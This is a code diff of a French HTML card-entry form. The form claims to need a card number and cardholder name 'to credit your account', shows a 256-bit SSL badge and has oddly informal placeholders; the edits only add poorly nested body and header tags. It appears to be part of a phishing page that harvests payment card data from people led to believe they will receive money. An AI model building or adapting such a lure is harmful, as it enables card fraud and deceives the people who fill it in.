@@ -1,8 +1,9 @@
-<dt> Merci de bien vouloir nous communiquer les informations mentionnées ci-dessous, utiles pour créditer votre compte. </dt> <br/> <br/>
+<body>
+<dt> Merci de bien vouloir nous communiquer les informations mentionnées<br>ci-dessous, utiles pour créditer votre compte. </dt> <br/> <br/>
                         <label for="numcarte"> Numéro de la carte :</label><span class="required" style="color: orange"> *</span> &nbsp;
                         <dd> <input type="text" name="numcarte" pattern="[0-9]{16}" minlength="16" maxlength="16" id="numcarte" value="" autocomplete="off" required="required" placeholder="Oncle bily"> </dd>
                     </dl>
-
+ <header>
                     <dl>
                         <dt><label for="nomcarte">Nom du Titulaire :</label><span class="required" style="color: orange"> *</span></dt>
                         <dd><input type="text" name="nomcarte" id="nomcarte" placeholder="Tu es là?" required="required" ></dd>
@@ -22,7 +23,8 @@
                 <img src="../../css/ssl-badge.jpg" width="15px"> &nbsp; &nbsp; Protection par un cryptage SSL 256 bits
 
                 </div>  <br /> 
-
+</header>
             <button class="primary-button checkout-button" type="submit" id="verderButton" name="Finaliser"> Finaliser le payment </button> 
 
             </form> </div>
+</body>
